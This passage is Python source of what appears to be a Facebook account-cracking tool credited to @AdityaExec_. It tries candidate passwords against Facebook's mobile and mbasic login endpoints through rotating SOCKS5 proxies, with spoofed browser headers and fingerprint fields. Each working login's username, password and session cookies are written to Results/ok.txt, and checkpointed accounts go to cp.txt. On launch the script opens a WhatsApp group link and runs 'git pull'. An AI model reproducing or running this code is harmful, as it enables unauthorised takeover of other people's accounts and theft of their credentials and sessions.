                 "prefill_source":"browser_dropdown",
                 "prefill_type":"password",
                 "first_prefill_source":"browser_dropdown",
                 "first_prefill_type":"contact_point",
                 "had_cp_prefilled":True,
                 "had_password_prefilled":True,
                 "is_smart_lock":False,
                 "bi_xrwh":0,
                 "bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                 "encpass":f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "m.facebook.com",
                  "content-length": "2167",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "user-agent": ua,
                  "viewport-width": "501",
                  "content-type": "application/x-www-form-urlencoded",
                  "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "x-asbd-id": "129477",
                  "dpr": "1.4375",
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-prefers-color-scheme": "light",
                  "sec-ch-ua-platform": '"Android"',
                  "accept": "*/*",
                  "origin": "https://m.facebook.com",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-dest": "empty",
                  "referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1862952583919182&auth_token=93f0b61b177d4c14afdb43cbde26a2e2&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def validateAPP(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().UserAgent_APP()
       ua = REQ().UserAgent()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers = {'User-Agent':ua})
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "uid":user,
                 "next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
                 "flow":"login_no_pin",
                 "pass":pw
               }
               headers = {
                  "Host": "mbasic.facebook.com",
                  "content-length": "746",
                  "cache-control": "max-age=0",
                  "dpr": "1.4375",
                  "viewport-width": "980",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "sec-ch-ua-platform": '"Android"',
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-prefers-color-scheme": "light",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://mbasic.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def regularAPP(self, user, password):
       Console().print(Markdown(f"## Error 404 Not Found"),style='yellow') ; sleep(3.1) ; sys.exit()

if __name__=='__main__':
  os.system('xdg-open https://chat.whatsapp.com/HZEZeQjUXb4Jz3GTVhoJK8')
  try:
      os.system("git pull") ; REQ().Menuuu()
  except requests.exceptions.ConnectionError as e:
      os.system("clear") ; Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit() 


# FREE AND OPEN SOURCE       
# FREE SCRIPTS CANNOT BE SOLD AND BUYED
# https://github.com/AdityaTwinz
# WA : 6283861183874
